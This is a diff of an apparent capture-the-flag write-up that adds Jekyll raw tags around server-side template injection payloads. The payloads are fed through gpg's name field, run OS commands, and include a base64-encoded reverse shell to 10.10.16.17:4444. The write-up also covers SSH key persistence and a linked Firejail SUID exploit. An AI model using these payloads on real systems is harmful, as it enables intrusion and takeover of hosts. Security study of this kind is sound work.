@@ -43,9 +43,9 @@ gpg --gen-key
 ```
 
 #### First Try
-Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put This SSTI payload in the name field. If it is vulnerable then it will give output `49` as a name.
+Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put This SSTI payload in the name field. If it is vulnerable then it will give output `49` as a[...]
 ```
-Real name: {{7*7}}
+Real name: {% raw %}{{7\*7}}{% endraw %}
 Email: anymail
 password: A1234567
 ```
@@ -98,14 +98,14 @@ gpg --list-key
 Then I again generate keys but this time the payload will be different. In the name field I put this payload below:
 
 ```
-{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{% raw %}{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}
 ```
 
 #### Second Try
 
 ```
 gpg --gen-key
-Real name: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+Real name: {% raw %}{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}
 Email: abdo@gmail.com
 password: A1234567
 ```
@@ -145,7 +145,7 @@ Result: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK`
 The final payload:
 
 ```
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK" | base64 -d | bash').read() }}
+{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK" | base64 -d | bash').read() }}{% endraw %}
 ```
 
 First, make our listener
@@ -157,7 +157,7 @@ nc -nvlp 4444
 
 ```
 gpg --gen-key
-Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
+Real name: {% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}{% endraw %}
 
 Email: abdo@gmail.com
 password: A1234567 Admin123
@@ -249,9 +249,9 @@ let output = Command::new("bash")
 
 ![](/assets/img/posts/pasted-image-20260820100111-png.svg)
 
-Setting our netcat listener, and get shell again with `Atlas` User.
+Setting our netcat listener, and get shell again with `Atlas` User.
 
-Here in `.ssh` folder I put my own `id_rsa.pub `file and rename it again with `authorized_keys` , then I use my own `id_rsa` to login as Atlas User.
+Here in `.ssh` folder I put my own `id_rsa.pub `file and rename it again with `authorized_keys` , then I use my own `id_rsa` to login as Atlas User.
 
 ![](/assets/img/posts/pasted-image-20260820100407-png.svg)
 
@@ -272,7 +272,7 @@ When I run linpeas.sh I found the following interesting file.
 
 ![[Pasted image /assets/img/posts/20250817000428-png.svg]]
 
-It has SUID permission. So we can use that for Exploitation. I search in **Google** for `Firejail exploit.` , I found this: https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
+It has SUID permission. So we can use that for Exploitation. I search in **Google** for `Firejail exploit.` , I found this: https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
 
 copy and paste it in our shell as explot.py, and gave to it
 ```
